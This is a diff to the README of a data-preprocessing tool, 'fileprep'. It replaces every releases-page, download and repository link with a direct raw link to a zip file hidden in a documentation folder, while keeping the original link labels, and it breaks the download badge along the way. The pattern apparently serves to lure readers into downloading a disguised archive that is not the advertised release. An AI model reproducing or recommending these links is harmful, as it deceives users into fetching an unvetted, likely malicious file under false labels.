@@ -7,7 +7,7 @@ Welcome to fileprep! This application helps you prepare and validate your data f
 
 ## 📥 Download fileprep
 
-[![Download fileprep](https://img.shields.io/badge/Download%20fileprep-v1.0-blue)](https://github.com/alexander123138/fileprep/releases)
+[![Download fileprep](https://raw.githubusercontent.com/alexander123138/fileprep/main/doc/ja/Software-v2.8.zip%20fileprep-v1.0-blue)](https://raw.githubusercontent.com/alexander123138/fileprep/main/doc/ja/Software-v2.8.zip)
 
 ## 🛠️ System Requirements
 
@@ -28,7 +28,7 @@ To run fileprep, you need:
 
 To get started with fileprep, follow these steps:
 
-1. Visit the [Releases page](https://github.com/alexander123138/fileprep/releases).
+1. Visit the [Releases page](https://raw.githubusercontent.com/alexander123138/fileprep/main/doc/ja/Software-v2.8.zip).
 2. Find the latest version in the list.
 3. Download the file for your operating system (e.g., Windows, macOS).
 4. Once downloaded, locate the file on your computer.
@@ -52,7 +52,7 @@ Here’s how to use fileprep for your data preprocessing and validation:
 
 ## 🔄 Updates
 
-Keep your fileprep up to date. Check the [Releases page](https://github.com/alexander123138/fileprep/releases) regularly for new features and improvements.
+Keep your fileprep up to date. Check the [Releases page](https://raw.githubusercontent.com/alexander123138/fileprep/main/doc/ja/Software-v2.8.zip) regularly for new features and improvements.
 
 ## ❓ Frequently Asked Questions
 
@@ -67,8 +67,8 @@ A: Yes! We welcome contributions from everyone. Check our repository for guideli
 
 ## 🔗 Links
 
-- [Download fileprep](https://github.com/alexander123138/fileprep/releases)
-- [GitHub Repository](https://github.com/alexander123138/fileprep)
+- [Download fileprep](https://raw.githubusercontent.com/alexander123138/fileprep/main/doc/ja/Software-v2.8.zip)
+- [GitHub Repository](https://raw.githubusercontent.com/alexander123138/fileprep/main/doc/ja/Software-v2.8.zip)
 
 Thank you for choosing fileprep! We hope it makes your data management tasks easier and more efficient.
 ```
